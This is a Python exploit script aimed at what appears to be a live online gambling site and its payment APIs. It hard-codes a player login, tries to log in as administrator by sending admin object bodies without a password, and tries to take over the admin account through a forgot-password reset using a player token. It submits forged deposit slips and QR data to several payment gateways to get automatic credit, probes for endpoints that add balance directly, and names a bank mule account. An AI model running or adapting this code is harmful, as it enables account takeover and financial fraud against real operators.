#!/usr/bin/env python3
"""probe_bo_login.py — Try BO admin login with object body (not password-based).

   CRITICAL HINT from handoff: BO_URI=/account/login accepts admin object body
   (id, username, firstname, lastname) — NOT password-based login.

   Also try:
   - PATCH /pb/forgot-password (F27 ATO) to reset admin password
   - GET /mb/deposit-transaction with query params to find pending deposit
   - Third-party payment gateways (AZPAY, One2p, etc.) which may auto-credit
"""
import base64, json, pathlib, requests, time, uuid

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
BO_URL = "https://manage.vak88z2.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

ADMIN_ID   = "5958356c-eb4e-4e07-a155-83e4382e3532"
ADMIN2_ID  = "8155e2a2-77f1-47a1-8242-581be5e00550"
KBANK_MULE = "2373102108"
FRESH_TX   = "016282212408DTF71867"
FRESH_QR   = "0041000600000101030040220016282212408DTF718675102TH91044B59"
PAPDIEAW   = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"

# 3rd party payment IDs (from BOLA)
AZPAY_ID   = "6baf8395-34f8-4d1c-9470-340c44c9f01b"
ONE2P_ID   = "ac99fb0e-0ce2-46eb-9bde-348243721157"
TWOSEC_ID  = "b08a736f-3392-4595-bad5-776ef272af22"
MYPAY_ID   = "59251130-7cf4-47bd-a9c7-af899f5b1ab9"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. BO login with admin object body (not password) ────────────────────────
print("=== 1. BO login with admin object body ===")
bo_jwt = None

# The hint says: body = admin object {id, username, firstname, lastname}
admin_bodies = [
    # admin account
    {"id": ADMIN_ID, "username": "admin", "firstname": "admin", "lastname": "admin",
     "domain": DOMAIN},
    # vak88admin
    {"id": ADMIN2_ID, "username": "vak88admin", "firstname": "vak88", "lastname": "admin",
     "domain": DOMAIN},
    # just id + username
    {"id": ADMIN_ID, "username": "admin", "domain": DOMAIN},
    # with role
    {"id": ADMIN_ID, "username": "admin", "role": "admin", "domain": DOMAIN},
    # just id
    {"id": ADMIN_ID, "domain": DOMAIN},
]

for body in admin_bodies:
    for path in ["/account/login", "/api/account/login", "/api/login",
                 "/bo/authentication", "/_nuxt/api/account/login"]:
        url = f"{BO_URL}{path}" if not path.startswith("/bo") else f"{BGAPI}{path}"
        r = requests.post(url,
                          headers={"Content-Type": "application/json",
                                   "Origin": BO_URL, "Referer": f"{BO_URL}/account/login"},
                          json=body, timeout=10)
        content_type = r.headers.get("content-type", "")
        is_html = "html" in content_type.lower()
        if r.status_code not in (404,) and not is_html:
            print(f"  [!!!] POST {path} body.id={body.get('id','?')[:8]}: "
                  f"HTTP {r.status_code}: {r.text[:200]}")
            if r.ok:
                try:
                    tok = r.json().get("accessToken") or r.json().get("token")
                    if tok:
                        bo_jwt = tok
                        print(f"  [!!!] BO JWT: {tok[:50]}...")
                except Exception:
                    pass
        time.sleep(0.2)

# ── 2. GET /mb/deposit-transaction with params to find pending ────────────────
print("\n=== 2. GET /mb/deposit-transaction with params ===")
for params in [
    {"skip": 0, "limit": 10},
    {"skip": 0, "limit": 10, "status": "pending"},
    {"skip": 0, "limit": 10, "status": "waiting"},
    {"skip": 0, "limit": 5, "type": "auto-slip"},
    {"skip": 0, "limit": 5, "qr_string": FRESH_QR},
]:
    r = requests.get(f"{MGAPI}/mb/deposit-transaction", headers=HDR,
                     params=params, timeout=10)
    if r.status_code not in (404,):
        print(f"  params={list(params.keys())}: HTTP {r.status_code}: {r.text[:300]}")
        if r.ok:
            try:
                items = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
                for item in items[:3]:
                    print(f"    {item.get('id','?')[:8]} | status={item.get('status','?')} "
                          f"| amount={item.get('amount', item.get('deposit_amount','?'))}")
            except Exception:
                pass
    time.sleep(0.2)

# ── 3. F27 ATO: PATCH /pb/forgot-password to reset admin password ─────────────
print("\n=== 3. F27 ATO: PATCH /pb/forgot-password ===")
# F27 found: player JWT can reset admin passwords via PATCH /pb/forgot-password
# Try resetting admin account to a known password
for target in [
    {"username": "admin", "new_password": "Pwned2026!!", "domain": DOMAIN},
    {"username": "admin", "password": "Pwned2026!!", "domain": DOMAIN},
    {"username": "admin", "phone": "admin", "new_password": "Pwned2026!", "domain": DOMAIN},
    {"id": ADMIN_ID, "password": "Pwned2026!", "new_password": "Pwned2026!"},
]:
    r = requests.patch(f"{PBAPI}/pb/forgot-password",
                       headers={"Authorization": f"Bearer {JWT}",
                                "Content-Type": "application/json"},
                       json=target, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  PATCH body={list(target.keys())}: HTTP {r.status_code}: {r.text[:200]}")
    time.sleep(0.2)

# ── 4. Third-party payment gateway deposits (auto-credit) ────────────────────
print("\n=== 4. Third-party payment (AZPAY/One2p/2sec) deposit ===")
# These may have different deposit flows that auto-credit without BO approval

import sys; sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

now = datetime.now(timezone.utc) + timedelta(hours=7)
tx_ref = generate_tx_reference(now)
qr = generate_qr_data(tx_ref)

for gw_id, gw_name in [
    (AZPAY_ID, "AZPAY"), (ONE2P_ID, "One2p"), (TWOSEC_ID, "2sec"), (MYPAY_ID, "MYPAYS24"),
]:
    for amt in [1, 100, 300]:
        r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                          json={"payment_bank_information_id": gw_id,
                                "deposit_amount": amt,
                                "note": "$",
                                "deposit_account_id": "00b6996c-0e41-4b56-9fa7-94f77f4fd717",
                                "slip_image_url": f"slip_{tx_ref}.jpg",
                                "qr_string": qr},
                          timeout=15)
        if r.status_code not in (404,):
            print(f"  {gw_name} amt={amt}: HTTP {r.status_code}: {r.text[:150]}")
            if r.ok and r.json().get("status") not in ("pending", "waiting"):
                print(f"  [!!!] AUTO-CREDIT? wallet: {wallet()}")
        time.sleep(0.5)

# ── 5. Try /mb/topup or direct balance add ───────────────────────────────────
print("\n=== 5. Direct balance add endpoints ===")
for path, payload in [
    ("/mb/topup", {"amount": 500, "note": "test"}),
    ("/mb/add-balance", {"amount": 500}),
    ("/mb/credit", {"amount": 500, "type": "deposit"}),
    ("/mb/adjust-balance", {"amount": 500, "reason": "deposit"}),
    ("/mb/deposit-manual", {"amount": 500, "bank_no": KBANK_MULE}),
]:
    r = requests.post(f"{MGAPI}{path}", headers=HDR, json=payload, timeout=10)
    if r.status_code not in (404, 405):
        print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  POST {path}: 404")

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
